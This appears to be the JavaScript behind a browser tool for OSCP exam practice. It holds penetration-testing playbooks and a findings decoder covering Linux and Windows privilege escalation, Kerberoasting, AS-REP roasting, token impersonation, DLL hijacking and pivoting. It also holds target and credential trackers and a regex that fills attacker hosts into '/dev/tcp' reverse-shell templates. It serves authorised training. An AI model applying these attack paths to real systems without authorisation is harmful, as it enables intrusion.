
const PLAYBOOKS=[{"name": "Linux Web → Root", "icon": "🐧", "signal": "80/443 + Linux host", "flow": ["Web/vhost enumeration", "Config/source/backup disclosure", "Credential reuse → SSH or app foothold", "Re-enumerate local host", "sudo → SUID → caps → cron/systemd → services → creds", "Containers/NFS/custom app", "Kernel/package CVE LAST"], "tags": ["[WEB:ENUM]", "[LINUX:TREE]", "[CREDS:FANOUT]"]}, {"name": "Windows Standalone", "icon": "▣", "signal": "445/3389/5985 or Windows shell", "flow": ["Validate credentials across SMB/WinRM/RDP", "Get stable shell", "whoami /priv + groups", "SYSTEM services/tasks", "Writable ACL / registry / DLL-PATH", "DPAPI / saved credentials / LAPS", "Driver/kernel LAST"], "tags": ["[PORT:445]", "[WIN:TREE]", "[WIN:SEIMPERSONATE]"]}, {"name": "AD Set → DC", "icon": "🏰", "signal": "88 + 389 + 445 + domain context", "flow": ["Confirm domain/DC/DNS/time", "SMB shares + LDAP users/groups/computers", "AS-REP / SPNs", "BloodHound graph", "ACL / delegation / AD CS", "Lateral movement → new host", "Local privesc + credential discovery", "Re-enumerate graph until DC path"], "tags": ["[AD:FLOW]", "[AD:KERBEROS]", "[AD:BLOODHOUND]", "[AD:ADCS]"]}, {"name": "Credential Reuse Cascade", "icon": "🔑", "signal": "Any password/hash/key/token", "flow": ["Classify local vs domain", "SMB → shares/admin", "WinRM / RDP", "MSSQL / SSH / web", "LDAP/Kerberos visibility", "New host or privilege?", "Re-enumerate immediately"], "tags": ["[CREDS:FANOUT]"]}, {"name": "Pivoted Internal Host", "icon": "🛣️", "signal": "New route/internal-only service", "flow": ["Can pivot host reach destination?", "Choose Ligolo/Chisel/SSH/Socat", "Add exact subnet route/forward", "Verify IP reachability before DNS", "Run normal service enumeration", "Treat new host as fresh machine", "Record route + session in tracker"], "tags": ["[PIVOT:FLOW]", "[PIVOT:LIGOLO]", "[ERROR:PIVOT]"]}, {"name": "Web Foothold Decision", "icon": "🌐", "signal": "HTTP service with no obvious exploit", "flow": ["Correct host/vhost first", "Source/robots/sitemap/headers", "Content + files + backups", "Authentication/reset/session", "Parameters/API/upload", "Map clue to SQLi/LFI/upload/SSRF/SSTI/etc.", "Exploit only after prerequisite validation"], "tags": ["[WEB:ENUM]", "[EXPLOIT:GATE]"]}, {"name": "Custom Linux Binary", "icon": "⚙️", "signal": "Unknown SUID/root-run app", "flow": ["file + permissions + owner", "strings + --help", "ldd/readelf", "strace/ltrace", "Relative command? config? library? plugin? temp file?", "Writable dependency + privileged trigger?", "Validate harmlessly → exploit"], "tags": ["[LINUX:SUID]", "[LINUX:PATH]", "[LINUX:PLUGIN]"]}, {"name": "Windows Service PrivEsc", "icon": "🛠️", "signal": "Privileged service + weak dependency", "flow": ["Confirm service account", "Check change-config rights", "Check executable/parent ACL", "Check unquoted candidate path", "Check DLL load/search path", "Can start/restart/trigger?", "Validate + preserve rollback path"], "tags": ["[WIN:SERVICE]", "[WIN:DLL]"]}];
const DECODER=[["sudo -l shows NOPASSWD binary", "High-priority privileged execution candidate", "Search GTFOBins/manual features; check env/args/files it controls", "Do not jump to kernel", "[LINUX:SUDO]"], ["Unknown SUID binary", "Custom privileged application", "file → strings → ldd → strace/ltrace → writable dependency", "Do not assume unknown means exploitable", "[LINUX:SUID]"], ["Unusual Linux capability", "Capability may cross a security boundary", "Confirm exact binary + capability semantics + controllable arguments", "Capability name alone is not root", "[LINUX:CAPABILITIES]"], ["Root cron/systemd executes writable target", "High-signal scheduled privileged execution", "Confirm owner/ACL + trigger/timing + exact executed target", "Avoid modifying before proof/rollback plan", "[LINUX:SYSTEMD]"], ["docker/lxd group", "Possible host-resource control", "Check socket/group/mount/privileged container access", "Docker installed ≠ root", "[LINUX:CONTAINER]"], ["no_root_squash on writable NFS export", "Strong NFS privilege path candidate", "Confirm mount/write/UID behavior and target trust model", "NFS export alone is not enough", "[LINUX:NFS]"], ["SeImpersonatePrivilege Enabled", "Token impersonation path candidate", "Exact Windows build + service context + required RPC/service primitive", "Do not run every Potato blindly", "[WIN:SEIMPERSONATE]"], ["SYSTEM service + writable executable/dir", "High-signal service privesc", "Confirm ACL + account + restart/trigger", "Unquoted path is irrelevant if no candidate is writable", "[WIN:SERVICE]"], ["SYSTEM scheduled task + writable script/binary", "Scheduled privileged execution", "Confirm exact target + ACL + trigger", "Do not alter unrelated task files", "[WIN:TASK]"], ["SeBackupPrivilege", "Protected file-read capability", "Confirm enabled privilege and usable backup/read path", "Privilege ≠ SYSTEM automatically", "[WIN:BACKUP]"], ["Procmon shows NAME NOT FOUND for DLL", "Potential DLL search-order opportunity", "Confirm privileged process + writable load directory + architecture/name", "Missing DLL alone is not exploitable", "[WIN:DLL]"], ["LAPS deployed", "Local admin password management exists", "Check whether your principal can actually read relevant attribute", "Deployment ≠ readable password", "[WIN:LAPS]"], ["88 + 389 + 445 + 53", "Strong AD/DC signature", "Treat services as one domain environment; confirm DC/DNS/time", "Do not enumerate each port in isolation", "[AD:FLOW]"], ["AS-REP roastable user", "Offline Kerberos credential path", "Request material, crack offline if appropriate, reuse result", "Do not assume crackability", "[AD:KERBEROS]"], ["SPN on service account", "Kerberoast candidate", "Request service ticket and evaluate password strength offline", "SPN ≠ guaranteed weak password", "[AD:KERBEROS]"], ["BloodHound GenericAll / GenericWrite", "Potential object control", "Validate exact source→target edge and allowed action", "Graph edge ≠ automatic DA", "[AD:ACL]"], ["AD CS installed", "Certificate Services exist", "Enumerate enabled/vulnerable templates and effective rights", "AD CS installed ≠ ESC path", "[AD:ADCS]"], ["nxc SMB indicates admin/Pwn3d", "Remote administrative capability likely", "Confirm remote-exec path and scope/local-vs-domain context", "Authentication success alone is not admin", "[AD:LATERAL]"], ["KRB_AP_ERR_SKEW", "Kerberos clock mismatch", "Compare attacker/DC time; fix DNS/DC identification and time sync", "Do not debug attack syntax first", "[ERROR:KRB_SKEW]"], ["SMB works but WinRM fails", "Credentials may be valid but WinRM unauthorized/unreachable", "Check 5985/5986 + Remote Management Users/admin policy", "Do not discard password immediately", "[ERROR:WINRM]"], ["HTTP 403", "Resource may exist but access context is blocked", "Verify vhost/auth/path/method/normalization/backend differences", "Do not spend 30m random-header spraying", "[ERROR:403]"], ["TLS certificate reveals another hostname", "Likely vhost/application clue", "Add hostname resolution and enumerate that host", "Do not keep testing only raw IP", "[WEB:ENUM]"], ["Internal-only listener after shell", "New attack surface", "Access locally or route through pivot; identify owning process/service", "External Nmap absence is expected", "[PIVOT:FLOW]"], ["Version-only CVE hit", "Hypothesis only", "Exact build/config/module/arch/prerequisites + matching PoC", "Never equate version string with exploitability", "[EXPLOIT:GATE]"]];
/* V19 has one search source: the reference the operator can actually see.
   Rebuild from the live DOM so corrected text and newly added cards cannot drift
   from a generated blob hidden elsewhere in this file. */
function buildSearchItems(){
 const items=[],seen=new Set();
 for(const node of document.querySelectorAll('#referenceRoot details[id],#referenceRoot h2[id],#referenceRoot h3[id],#referenceRoot h4[id]')){
  if(seen.has(node.id))continue;seen.add(node.id);
  const summary=node.firstElementChild?.tagName==='SUMMARY'?node.firstElementChild:null;
  const heading=!summary&&/^H[2-4]$/.test(node.tagName||'');
  const siblings=heading&&node.parentElement?[...node.parentElement.children]:[],position=siblings.indexOf(node);
  const context=heading?[node,...siblings.slice(position+1,position+4).filter(x=>!/^H[1-4]$/.test(x.tagName||''))]:[node];
  const text=context.map(x=>x.innerText||x.textContent||'').join('\n').trim();
  items.push({
   title:(summary?.textContent||node.textContent||node.id).trim(),
   anchor:node.id,
   tags:[...new Set([...text.matchAll(/\[[A-Z0-9:_.-]+\]/g)].map(x=>x[0]))],
   text,
   kind:'detail'
  });
 }
 return items;
}
let SEARCH_ITEMS=buildSearchItems();

const STORE='oscp_v16_';
/* Boot-resilience: one malformed localStorage value must never white-screen the exam console. */
window.__OSCP_CORRUPT_STORAGE__=window.__OSCP_CORRUPT_STORAGE__||[];
function safeStoredJSON(key,fallback){
 try{
  const raw=localStorage.getItem(key);
  if(raw===null||raw==='')return fallback;
  return JSON.parse(raw);
 }catch(e){
  window.__OSCP_CORRUPT_STORAGE__.push(key);
  console.warn('[OSCP] Ignoring malformed saved state:',key,e);
  return fallback;
 }
}
function safeStoredArray(key){
 const value=safeStoredJSON(key,[]);
 if(Array.isArray(value))return value;
 window.__OSCP_CORRUPT_STORAGE__.push(key+':shape');
 console.warn('[OSCP] Ignoring wrong-shaped saved array:',key);
 return [];
}
function safeStoredRecord(key,fallback={}){
 const value=safeStoredJSON(key,fallback);
 if(value&&typeof value==='object'&&!Array.isArray(value))return value;
 window.__OSCP_CORRUPT_STORAGE__.push(key+':shape');
 console.warn('[OSCP] Ignoring wrong-shaped saved object:',key);
 return fallback;
}
let __oscpStorageWriteWarned=false;
function safeStoreSet(key,value){
 try{localStorage.setItem(key,value);return true}catch(e){
  console.error('[OSCP] Browser storage write failed:',key,e);
  if(!__oscpStorageWriteWarned){__oscpStorageWriteWarned=true;setTimeout(()=>{if(typeof toast==='function')toast('Browser storage write failed — export an encrypted/session backup now; local state may not persist.');const sw=document.getElementById('v16StorageWarning');if(sw){sw.style.display='block';sw.innerHTML='<b>⚠ Browser storage write failed.</b><div class="tiny">Quota or browser storage restrictions prevented persistence. Export an encrypted/session backup now; current in-tab state may be newer than what is saved.</div>'}},0)}
  return false;
 }
}
function safeStoreGet(key,fallback=''){
 try{const v=localStorage.getItem(key);return v===null?fallback:v}catch(e){
  window.__OSCP_CORRUPT_STORAGE__.push(key+':unavailable');
  console.warn('[OSCP] Browser storage read failed:',key,e);return fallback;
 }
}
function safeStoreRemove(key){try{localStorage.removeItem(key);return true}catch(e){console.warn('[OSCP] Browser storage remove failed:',key,e);return false}}
const defaultSettings={TARGET:'',LHOST:'',LPORT:'4444',DOMAIN:'',DC:'',DC_IP:'',USERNAME:'',PASSWORD:''};
let settings={...defaultSettings,...safeStoredRecord(STORE+'settings',{})};
settings.PASSWORD=''; // always session-only
let persistSecrets=safeStoreGet(STORE+'persistSecrets','0')==='1';
let sessionSecrets={};
let targets=safeStoredArray(STORE+'targets');
const storedEvidenceTimer=safeStoredRecord(STORE+'evidenceTimer',{});
let timer={running:!!storedEvidenceTimer.running,started:Number.isFinite(+storedEvidenceTimer.started)?+storedEvidenceTimer.started:0,elapsed:Number.isFinite(+storedEvidenceTimer.elapsed)?Math.max(0,+storedEvidenceTimer.elapsed):0,tick:null,limitMinutes:Number.isFinite(+storedEvidenceTimer.limitMinutes)?Math.min(120,Math.max(10,Math.round(+storedEvidenceTimer.limitMinutes))):30,targetKey:String(storedEvidenceTimer.targetKey||'')};
if(timer.running&&(!timer.started||timer.started>Date.now()+60000)){timer.running=false;timer.started=0}

const $=s=>document.querySelector(s), $$=s=>[...document.querySelectorAll(s)];
function toast(s){const t=$('#toast');t.textContent=s;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),1500)}
if(window.__OSCP_CORRUPT_STORAGE__.length)setTimeout(()=>toast(`Recovered from ${window.__OSCP_CORRUPT_STORAGE__.length} malformed saved-state entr${window.__OSCP_CORRUPT_STORAGE__.length===1?'y':'ies'} — app started with safe defaults.`),80);
async function copyText(s){try{if(navigator.clipboard&&navigator.clipboard.writeText){await navigator.clipboard.writeText(s);return true}}catch(e){}try{const ta=document.createElement('textarea');ta.value=s;ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.focus();ta.select();const ok=document.execCommand('copy');ta.remove();return ok}catch(e){return false}}
function switchView(id){$$('.view').forEach(v=>v.classList.toggle('active',v.id===id));$$('.navbtn').forEach(b=>b.classList.toggle('active',b.dataset.view===id));window.scrollTo({top:0,behavior:'auto'});if(id==='searchView') renderSearch($('#globalSearch').value);}
$$('.navbtn').forEach(b=>b.onclick=()=>switchView(b.dataset.view));

document.addEventListener('keydown',e=>{if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='k'){e.preventDefault();$('#globalSearch').focus();$('#globalSearch').select();}});
$('#globalSearch').addEventListener('input',e=>{if(e.target.value.trim()){switchView('searchView');renderSearch(e.target.value)}});

function norm(s){return (s||'').toLowerCase().replace(/[^a-z0-9:_\-\[\]\. ]+/g,' ')}
function fuzzyScore(item,q){if(window.OSCP_SEARCH_CORE?.fuzzyScore)return window.OSCP_SEARCH_CORE.fuzzyScore(item,q);q=norm(q).trim();if(!q)return 0;const title=norm(item.title),tags=norm((item.tags||[]).join(' ')),body=norm(item.text);let score=0;if(title===q)score+=100;if(tags.includes(q))score+=80;if(title.includes(q))score+=55;if(body.includes(q))score+=20;const toks=q.split(/\s+/).filter(Boolean);for(const t of toks){if(tags.includes(t))score+=25;if(title.includes(t))score+=18;if(body.includes(t))score+=5;}return score}
function esc(s){return window.OSCP_UTILS.escapeHtml(s)}
function validRecordId(v){return typeof v==='string'&&/^[A-Za-z0-9._:-]{1,160}$/.test(v)}
function plainRecord(v){return !!v&&typeof v==='object'&&!Array.isArray(v)}
function renderSearch(q){q=q||'';let scored=SEARCH_ITEMS.map(x=>({...x,score:fuzzyScore(x,q)})).filter(x=>x.score>0).sort((a,b)=>b.score-a.score).slice(0,60);$('#searchStats').textContent=q?`${scored.length} best matches for “${q}”`:'Type a tag, port, error, privilege, tool, or clue.';$('#searchResults').innerHTML=scored.map(x=>`<div class="result"><div class="row" style="justify-content:space-between"><div class="resultTitle">${esc(x.title)}</div><span class="score">score ${x.score}</span></div><div class="chips">${(x.tags||[]).slice(0,8).map(t=>`<span class="chip click" data-tag="${esc(t)}">${esc(t)}</span>`).join('')}</div><div class="resultText">${esc(x.text.replace(/\s+/g,' ').slice(0,520))}</div><button class="btn" data-open="${esc(x.anchor)}">Open in full reference →</button></div>`).join('')||'<div class="card muted">No match. Try a shorter term or exact [TAG].</div>';$$('[data-open]').forEach(b=>b.onclick=()=>openRef(b.dataset.open));$$('[data-tag]').forEach(c=>c.onclick=()=>{$('#globalSearch').value=c.dataset.tag;renderSearch(c.dataset.tag)});}
function openRef(anchor){switchView('referenceView');setTimeout(()=>{const el=document.getElementById(anchor);if(!el)return;let d=el.closest('details');if(d)d.open=true;el.scrollIntoView({behavior:'smooth',block:'start'});el.classList.add('highlight');setTimeout(()=>el.classList.remove('highlight'),1800)},30)}

const quick=[['🐧','Linux shell','[LINUX:TREE]'],['▣','Windows shell','[WIN:WORKFLOW]'],['🏰','Domain creds','[AD:FLOW]'],['🎫','Rubeus / tickets','Rubeus'],['👤','AD usernames','[AD:USERNAMES]'],['🔑','Password / hash','[CREDS:FANOUT]'],['🌐','Web target','[WEB:ENUM]'],['🛣️','Internal subnet','[PIVOT:FLOW]'],['POTATO','SeImpersonate','[WIN:SEIMPERSONATE]'],['⚙️','Custom SUID','[LINUX:SUID]'],['📸','Need proof','[EVIDENCE:PACKET]']];
$('#quickActions').innerHTML=quick.map(x=>`<button class="quick" data-q="${x[2]}"><b>${x[0]} ${x[1]}</b><br><span class="muted">${x[2]}</span></button>`).join('');$$('.quick').forEach(b=>b.onclick=()=>{$('#globalSearch').value=b.dataset.q;switchView('searchView');renderSearch(b.dataset.q)});

function saveSettings(){const persistent={...settings};delete persistent.PASSWORD;safeStoreSet(STORE+'settings',JSON.stringify(persistent));renderPlaceholders();applyPlaceholders();renderEvidenceTemplate();toast('Placeholders applied')}
const fields=[['TARGET','Target IP'],['LHOST','LHOST'],['LPORT','LPORT'],['DOMAIN','Domain'],['DC','DC hostname'],['DC_IP','DC IP'],['USERNAME','Username']];
function renderSettings(){ $('#settingsGrid').innerHTML=fields.map(([k,l])=>`<div class="field"><label>${l}</label><input data-setting="${k}" autocomplete="off" spellcheck="false" value="${esc(settings[k]||'')}"></div>`).join('');$$('[data-setting]').forEach(i=>i.oninput=()=>settings[i.dataset.setting]=i.value);$('#persistSecrets').checked=persistSecrets;}
function renderPlaceholders(){const keys=['TARGET','LHOST','LPORT','DOMAIN','DC','DC_IP','USERNAME'];$('#placeholderChips').innerHTML=keys.map(k=>`<span class="chip">${k}: ${esc(settings[k]||'—')}</span>`).join('')+`<span class="chip">SECRETS: Credential Matrix / Command Builder only</span>`;}
function substitute(raw){
 let s=String(raw??'');const m={TARGET:settings.TARGET,LHOST:settings.LHOST,LPORT:settings.LPORT,DOMAIN:settings.DOMAIN,DC:settings.DC,DC_IP:settings.DC_IP,USERNAME:settings.USERNAME};
 // Replace explicit value placeholders only. Never rewrite command keywords, shell // variable names (for example `export DOMAIN=...` / `set LHOST ...`), `%USERNAME%`,
 // or conceptual labels such as TARGET/DOMAIN in decision trees.
 const explicit=[[/\$TARGET\b|\bTARGET_IP\b|<TARGET>|<IP>/g,m.TARGET],[/\$IP\b/g,m.TARGET],[/\$LHOST\b|<LHOST>/g,m.LHOST],[/\$LPORT\b|<LPORT>/g,m.LPORT],[/\$DOMAIN\b|<DOMAIN>/g,m.DOMAIN],[/\$DC_IP\b|<DC_IP>/g,m.DC_IP],[/\$DC\b|<DC>/g,m.DC],[/\$USERNAME\b|<USERNAME>/g,m.USERNAME]];
 for(const [re,v] of explicit)if(v)s=s.replace(re,v);
 // A few legacy snippets use bare placeholders as URL/UNC or payload values.
 // Replace only the value position so the surrounding command grammar stays intact.
 if(m.TARGET)s=s.replace(/(https?:\/\/)TARGET(?=[:/\s'\"]|$)/g,`$1${m.TARGET}`);
 if(m.LHOST){s=s.replace(/(https?:\/\/)LHOST(?=[:/\s'\"]|$)/g,`$1${m.LHOST}`).replace(/(\\\\)LHOST(?=[\\/])/g,`$1${m.LHOST}`).replace(/(\/dev\/tcp\/)LHOST(?=\/)/g,`$1${m.LHOST}`).replace(/\bLHOST=LHOST\b/g,`LHOST=${m.LHOST}`).replace(/\bset\s+LHOST\s+LHOST\b/gi,`set LHOST ${m.LHOST}`);}
 if(m.LPORT){s=s.replace(/\bLPORT=LPORT\b/g,`LPORT=${m.LPORT}`).replace(/\bset\s+LPORT\s+LPORT\b/gi,`set LPORT ${m.LPORT}`);}
 if(m.USERNAME)s=s.replace(/(-u\s+)(?:user)(\b)/g,`$1${m.USERNAME}$2`).replace(/DOMAIN\/user/g,(m.DOMAIN||'DOMAIN')+'/'+m.USERNAME);
 return s;}
function prepareCode(){ $$('#referenceRoot pre').forEach(pre=>{const code=pre.querySelector('code');if(!code)return;if(!code.dataset.raw)code.dataset.raw=code.textContent; if(!pre.querySelector('.copybtn')){const b=document.createElement('button');b.className='copybtn noPrint';b.textContent='Copy';b.onclick=async()=>await guardedCopyText(code.textContent,'Reference snippet',null,{allowPlaceholders:true});pre.appendChild(b)}}); applyPlaceholders();}
function applyPlaceholders(){ $$('#referenceRoot pre code').forEach(code=>{if(code.dataset.raw)code.textContent=substitute(code.dataset.raw)});}

function applySecretPersistence(want){persistSecrets=!!want;safeStoreSet(STORE+'persistSecrets',persistSecrets?'1':'0');saveTargets();if(typeof saveOps==='function')saveOps();return persistSecrets}
$('#saveSettings').onclick=saveSettings;$('#persistSecrets').onchange=e=>{const want=!!e.target.checked;if(want&&!confirm('Persist secrets in this browser?\n\nThis stores target/credential secret fields as plaintext in localStorage on this profile. Prefer session-only secrets plus an encrypted backup unless you explicitly accept that risk.')){e.target.checked=false;return}applySecretPersistence(want);toast(want?'Secret persistence enabled — plaintext localStorage risk accepted':'Secret persistence disabled — saved target and credential secret fields scrubbed')};
/* clearLocal is bound once by the current destructive-action safety layer later. */

const statusKeys=[['tcp','Full TCP'],['udp','Useful UDP'],['web','Web/vhost'],['creds','Creds tested'],['foothold','Foothold'],['local','local.txt'],['privesc','PrivEsc'],['proof','proof.txt']];
function newTarget(){return{id:crypto.randomUUID?crypto.randomUUID():Date.now()+'-'+Math.random(),ip:'',host:'',role:'unknown',notes:'',next:['','',''],status:{},creds:'',updated:Date.now()}}
function saveTargets(){const arr=targets.map(t=>({...t,creds:persistSecrets?t.creds:''}));safeStoreSet(STORE+'targets',JSON.stringify(arr));refreshTimerTargets()}
function renderTargets(){if(!targets.length){$('#targetList').innerHTML='<div class="card muted">No targets yet. Add one and use the checklist to prevent missed enumeration.</div>';return}$('#targetList').innerHTML=targets.map(t=>`<div class="target" data-id="${esc(t.id)}"><div class="targetHead"><div><div class="targetTitle">${esc(t.ip||'New target')} ${t.host?'· '+esc(t.host):''}</div><div class="muted">${esc(t.role)}</div></div><button class="btn bad delTarget">Delete</button></div><div class="row" style="margin-top:8px"><input class="tIP" placeholder="IP" value="${esc(t.ip)}"><input class="tHost" placeholder="hostname" value="${esc(t.host)}"><select class="tRole"><option>unknown</option><option>linux</option><option>windows</option><option>web</option><option>ad-member</option><option>dc</option><option>pivot</option></select></div><div class="checks">${statusKeys.map(([k,l])=>`<label class="check"><input class="tCheck" data-k="${k}" type="checkbox" ${t.status[k]?'checked':''}> ${l}</label>`).join('')}</div><div class="field"><label>Credentials / auth material ${persistSecrets?'(persisted locally)':'(session only)'}</label><textarea class="tCreds" autocomplete="off" spellcheck="false" placeholder="user : secret / hash / key source">${esc(sessionSecrets[t.id]??t.creds??'')}</textarea></div><div class="field"><label>Interesting evidence / notes</label><textarea class="tNotes" placeholder="ports, files, groups, internal listeners, hypotheses…">${esc(t.notes)}</textarea></div><div class="field"><label>Next 3 actions</label>${[0,1,2].map(i=>`<input class="tNext" data-i="${i}" placeholder="${i+1}." value="${esc(t.next[i]||'')}">`).join('')}</div></div>`).join('');
 $$('.target').forEach(el=>{const id=el.dataset.id,t=targets.find(x=>x.id===id);el.querySelector('.tRole').value=t.role;const sync=()=>{t.ip=el.querySelector('.tIP').value;t.host=el.querySelector('.tHost').value;t.role=el.querySelector('.tRole').value;t.notes=el.querySelector('.tNotes').value;el.querySelectorAll('.tNext').forEach(x=>t.next[+x.dataset.i]=x.value);el.querySelectorAll('.tCheck').forEach(x=>t.status[x.dataset.k]=x.checked);const c=el.querySelector('.tCreds').value;sessionSecrets[id]=c;t.creds=persistSecrets?c:'';t.updated=Date.now();saveTargets()};el.querySelectorAll('input,textarea,select').forEach(x=>x.onchange=sync);el.querySelector('.tCreds').oninput=()=>{sessionSecrets[id]=el.querySelector('.tCreds').value;if(persistSecrets){t.creds=sessionSecrets[id];saveTargets()}};el.querySelector('.delTarget').onclick=()=>{if(confirm('Delete this target tracker card?')){targets=targets.filter(x=>x.id!==id);delete sessionSecrets[id];saveTargets();renderTargets()}};});}
$('#addTarget').onclick=()=>{targets.push(newTarget());saveTargets();renderTargets()};
/* Target export is bound later by the current secret-free export layer. */
$('#importTargets').onchange=async e=>{const f=e.target.files[0];if(!f)return;try{const o=JSON.parse(await f.text());if(!Array.isArray(o.targets))throw 0;targets=o.targets.map(x=>({...newTarget(),...x}));targets.forEach(t=>{if(t.creds)sessionSecrets[t.id]=t.creds;if(!persistSecrets)t.creds=''});saveTargets();renderTargets();toast('Targets imported')}catch{alert('Invalid target JSON')}};

function evidenceTimerPayload(){return{running:!!timer.running,started:+timer.started||0,elapsed:Math.max(0,+timer.elapsed||0),limitMinutes:evidenceTimerLimit(),targetKey:String(timer.targetKey||'')}}
function saveEvidenceTimer(){safeStoreSet(STORE+'evidenceTimer',JSON.stringify(evidenceTimerPayload()))}
function refreshTimerTargets(){const s=$('#timerTarget');if(!s)return;const old=timer.targetKey||s.value;s.innerHTML='<option value="">Target / surface</option>'+targets.map(t=>`<option value="${esc(t.id)}">${esc(t.ip||t.host||'unnamed')}</option>`).join('')+'<option value="surface:web">web surface</option><option value="surface:ad">AD surface</option><option value="surface:privesc">privesc surface</option>';s.value=[...s.options].some(o=>o.value===old)?old:'';timer.targetKey=s.value;if(old&&old!==timer.targetKey)saveEvidenceTimer()}
function evidenceTimerLimit(value=timer.limitMinutes){const n=Number(value);return Number.isFinite(n)?Math.min(120,Math.max(10,Math.round(n))):30}
function setEvidenceTimerLimit(value){timer.limitMinutes=evidenceTimerLimit(value);['rotateMinutes','simpleRotateMinutes'].forEach(id=>{const el=$('#'+id);if(el)el.value=timer.limitMinutes});saveEvidenceTimer();updateTimer()}
function evidenceTimerTargetLabel(){if(!timer.targetKey)return'';if(timer.targetKey.startsWith('surface:'))return timer.targetKey.slice(8);const t=targets.find(x=>x.id===timer.targetKey);return t?targetLabel(t):''}
function updateTimer(){
 const ms=timer.elapsed+(timer.running?(Date.now()-timer.started):0),sec=Math.floor(ms/1000),m=Math.floor(sec/60),s=sec%60,lim=evidenceTimerLimit()*60,pct=Math.min(100,sec/lim*100),display=String(m).padStart(2,'0')+':'+String(s).padStart(2,'0'),label=evidenceTimerTargetLabel();
 const core=pct>=100?'ROTATE unless you can name the new evidence':timer.running?'Evidence clock running':sec?'Paused — resume or record the return condition':'Ready — start when testing one hypothesis';const message=label?`${core} · ${label}`:core;
 [['timerDisplay','timerMsg','timerBar'],['simpleTimerDisplay','simpleTimerMsg','simpleTimerBar']].forEach(([displayId,msgId,barId])=>{const d=$('#'+displayId),msg=$('#'+msgId),bar=$('#'+barId);if(d)d.textContent=display;if(msg)msg.textContent=message;if(bar){bar.style.width=pct+'%';bar.className='bar '+(pct>=100?'bad':pct>=80?'warn':'')}});
}
function startEvidenceTimer(){if(timer.running)return;const sel=$('#timerTarget');if(sel)timer.targetKey=sel.value||timer.targetKey;timer.running=true;timer.started=Date.now();clearInterval(timer.tick);timer.tick=setInterval(updateTimer,500);saveEvidenceTimer();updateTimer()}
function pauseEvidenceTimer(){if(!timer.running)return;timer.elapsed+=Date.now()-timer.started;timer.running=false;timer.started=0;clearInterval(timer.tick);timer.tick=null;saveEvidenceTimer();updateTimer()}
function resetEvidenceTimer(){timer.running=false;clearInterval(timer.tick);timer.tick=null;timer.elapsed=0;timer.started=0;saveEvidenceTimer();updateTimer()}
['timerStart','simpleTimerStart'].forEach(id=>{const el=$('#'+id);if(el)el.onclick=startEvidenceTimer});
['timerPause','simpleTimerPause'].forEach(id=>{const el=$('#'+id);if(el)el.onclick=pauseEvidenceTimer});
['timerReset','simpleTimerReset'].forEach(id=>{const el=$('#'+id);if(el)el.onclick=resetEvidenceTimer});
['rotateMinutes','simpleRotateMinutes'].forEach(id=>{const el=$('#'+id);if(el)el.onchange=()=>setEvidenceTimerLimit(el.value)});
const timerTargetSelect=$('#timerTarget');if(timerTargetSelect)timerTargetSelect.onchange=()=>{timer.targetKey=timerTargetSelect.value;saveEvidenceTimer();updateTimer()};
setEvidenceTimerLimit(timer.limitMinutes||30);refreshTimerTargets();if(timer.running){clearInterval(timer.tick);timer.tick=setInterval(updateTimer,500)}updateTimer();

function renderPlaybooks(){ $('#playbooks').innerHTML=PLAYBOOKS.map(p=>`<div class="card span6 playbook"><div class="playhead"><span>${p.icon}</span>${esc(p.name)}</div><div class="muted">When: ${esc(p.signal)}</div><div class="flow">${p.flow.map((s,i)=>`${i?'<span class="arrow">→</span>':''}<span class="step">${esc(s)}</span>`).join('')}</div><div class="chips">${p.tags.map(t=>`<span class="chip click" data-pbtag="${esc(t)}">${esc(t)}</span>`).join('')}</div></div>`).join('');$$('[data-pbtag]').forEach(c=>c.onclick=()=>{$('#globalSearch').value=c.dataset.pbtag;switchView('searchView');renderSearch(c.dataset.pbtag)});}
function renderDecoder(q=''){q=norm(q);const arr=DECODER.filter(x=>!q||norm(x.join(' ')).includes(q));$('#decoderGrid').innerHTML=arr.map(x=>`<div class="decoder"><div class="obs">${esc(x[0])}</div><dl><dt>Meaning</dt><dd>${esc(x[1])}</dd><dt>Check next</dt><dd>${esc(x[2])}</dd><dt>Don't</dt><dd>${esc(x[3])}</dd></dl><span class="chip click" data-dtag="${esc(x[4])}">${esc(x[4])}</span></div>`).join('');$$('[data-dtag]').forEach(c=>c.onclick=()=>{$('#globalSearch').value=c.dataset.dtag;switchView('searchView');renderSearch(c.dataset.dtag)});}
$('#decoderSearch').oninput=e=>renderDecoder(e.target.value);

function shuffle(a){for(let i=a.length-1;i>0;i--){let j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]]}return a}

const evidence=['Target IP/hostname recorded','Exact vuln/misconfiguration recorded','Exact commands recorded','Exploit modifications saved','Credentials + source recorded','local.txt from original location','Local flag submitted','Local screenshot has proof + IP','PrivEsc reasoning recorded','root/SYSTEM confirmed','proof.txt from original location','Proof flag submitted','Proof screenshot has proof + IP','Pivot/routes recorded','Steps reproducible without memory'];
$('#evidenceChecks').innerHTML=evidence.map(x=>`<label><input type="checkbox"> ${esc(x)}</label>`).join('');
function makeEvidenceTemplate(){return `============================================================\nTARGET\n============================================================\nIP: ${settings.TARGET||'TARGET'}\nHOSTNAME:\nOS / ROLE:\nDOMAIN: ${settings.DOMAIN||''}\n\nENUMERATION\nTCP PORTS:\nUDP PORTS:\nHOSTNAMES / VHOSTS:\nEXACT VERSIONS:\nINTERNAL SERVICES:\n\nCREDENTIALS\nUSER:\nSECRET TYPE:\nSOURCE:\nVALIDATED ON:\nACCESS GAINED:\n\nFOOTHOLD\nVECTOR:\nPREREQUISITES VALIDATED:\nEXACT COMMANDS:\nINITIAL USER:\nLOCAL.TXT:\nSCREENSHOT:\n\nPRIVILEGE ESCALATION\nVECTOR:\nWHY IT WORKS:\nVALIDATION:\nEXPLOIT COMMANDS:\nROOT / SYSTEM CONFIRMED:\nPROOF.TXT:\nSCREENSHOT:\n\nPIVOT / LATERAL\nROUTES:\nTUNNEL:\nNEW HOSTS:\nNEW CREDS:\n\nNEXT 3 ACTIONS\n1.\n2.\n3.\n`}
function renderEvidenceTemplate(){$('#evidenceTemplate').textContent=makeEvidenceTemplate()}
$('#copyEvidence').onclick=async()=>toast(await copyText($('#evidenceTemplate').textContent)?'Evidence template copied':'Copy blocked — select manually');

$('#collapseDetails').onclick=()=>$$('#referenceRoot details').forEach(d=>d.open=false);$('#expandDetails').onclick=()=>$$('#referenceRoot details').forEach(d=>d.open=true);
$('#themeBtn').onclick=()=>$('#referenceRoot').classList.toggle('darkRef');

// Dark reference override generated here to avoid a second stylesheet.
